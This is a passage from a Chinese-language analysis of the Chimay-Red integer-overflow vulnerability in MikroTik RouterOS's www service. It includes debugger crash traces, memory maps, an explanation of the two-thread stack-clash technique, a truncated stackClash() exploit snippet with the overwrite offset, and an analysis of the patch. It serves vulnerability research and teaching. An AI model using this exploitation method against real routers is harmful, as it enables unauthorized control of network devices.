       0x8055a6a    call   0x8050c40    // istream::read(char *,uint)
由于`content-length=-1`，调用`alloca()`后栈空间未进行调整，之后在调用`istream::read()`时，由于传入的`size`参数为`-1`(即`0xffffffff`)，继续执行时会报错。
    pwndbg> c                                                                                 
    Thread 2 "www" received signal SIGSEGV, Segmentation fault.                               
    0x77569e0e in streambuf::xsgetn(char*, unsigned int) () from target:/lib/libuc++.so       
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                                         
    ──────────────────────────[ REGISTERS ]──────────────────────────   
    *EDI  0x77509000 ◂— 0x75e                                                                 
    *ESI  0x8065ca7 ◂— 0x6168c08                                                             
    ──────────────────────────[ DISASM ]────────────────────────────
     ► 0x77569e0e    rep movsb byte ptr es:[edi], byte ptr [esi]
在崩溃点`0x77569e90`处，`edi`的值为`0x77509000`，由于其指向的地址空间不可写，故出现`Segmentation fault`。
    0x774ea000 0x77509000 rw-p    1f000 0       x/wx $esp
    0x77508180:     0x77508208
    pwndbg> x/4wx $ebp
    0x775081a8:     0x77508238      0x774e0e69  `Chimay-Red`中通过关闭套接字的方式使`istream::read()`提前返回，但并没有读取请求体中的数据。如果有其他的方式，欢迎交流:)
###  content-length的值过大
根据前面可知，当`content-length`的值过大时(`>0x20000`)，在`Request::readPostData()`中，会对线程的栈空间进行调整，使得当前线程栈指针`esp`“溢出”(即指向与当前线程栈空间相邻的低地址区域)。同样在执行后续指令时，由于`esp`指向的某些地址空间不可写，也会出现`Segmentation
fault`。
    pwndbg> vmmap
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     0x8048000  0x805c000 r-xp    14000 0      /nova/bin/www
     0x805c000  0x805d000 rw-p     1000 14000  /nova/bin/www
     0x805d000  0x8069000 rw-p     c000 0      [heap]
    0x774d7000 0x774db000 r-xp     4000 0      /lib/libucrypto.so
    0x774db000 0x774dc000 rw-p     1000 3000   /lib/libucrypto.so
    0x774dc000 0x774e6000 r-xp     a000 0      /nova/lib/www/jsproxy.p
    0x774e6000 0x774e7000 rw-p     1000 a000   /nova/lib/www/jsproxy.p    (使esp"溢出"到这里)
    0x774e9000 0x774ea000 ---p     1000 0
    0x774ea000 0x77509000 rw-p    1f000 0        在这个例子中，`0x54c` 是通过`cyclic pattern`方式确定的。
此时，`thread2`仍然在等待`client2`的数据，`client2`通过关闭连接，即可使对应的函数返回。由于对应的返回地址已被覆盖，从而达到劫持控制流的目的。
参考`Chimay-Red`工具中的[StackClashPOC.py](https://github.com/BigNerd95/Chimay-Red/blob/master/POCs/StackClashPOC.py)，对应上述流程的代码如下。
    # 可参考StackClashPOC.py中详细的注释
    def stackClash(ip):
        s1 = makeSocket(ip, 80) # client1, thread1
        s2 = makeSocket(ip, 80) # client2, thread2
        socketSend(s1, makeHeader(0x20900)) 
        socketSend(s2, makeHeader(0x200)) 
        socketSend(s1, b'a'*0x54c+ struct.pack(' `Chimay-Red`工具:
> 由于`www`程序中存在`dlsym()`，可通过调用`dlsym(0,"system")`的方式查找`system()`
## 补丁分析
在`6.38.5`版本中对该漏洞进行了修复，对应的`Request::readPostDate()`函数的部分伪代码如下。其中，1)
在调用该函数时，传入的`a3`参数为`0x20000`，因此会对`content-length`的大小进行限制；2)
读取的数据保存在string类型中，即将数据保存在堆上。
    char Request::readPostData(Request *this, string *a2, unsigned int a3)
    {
      // ...
      v7 = 0;
      string::string((string *)&v6, "content-length");
      v3 = Headers::getHeader((Headers *)this, (const string *)&v6, &v7);
      if ( v3 )
      {
        if ( a3 >= v7 )    // jsproxy.p中, 传入的参数a3为0x20000
        {
          string::string((string *)&v6);
          wrap_str_assign(a2, (const string *)&v6);
          string::~string((string *)&v6);
          string::resize(a2, v7, 0);   // 使用sting类型来保存数据
          v5 = istream::read((istream *)(this + 8), (char *)(*(_DWORD *)a2 + 4), v7);
       // ...
## 小结
  * 漏洞形成的原因为：在获取`HTTP`请求头中`content-length`值后，未对其进行有效校验，造成后续存在整数溢出问题；
  * `Chimay-Red`工具中通过堆叠两个线程栈空间的方式完成漏洞利用。
## 相关链接
  * [Chimay-Red](https://blog.seekintoo.com/chimay-red/)
  * [Chimay-Red: Working POC of Mikrotik exploit from Vault 7 CIA Leaks](https://github.com/BigNerd95/Chimay-Red)
  * [Chimay-Red: RouterOS Integer Overflow Analysis](https://www.anquanke.com/post/id/195767)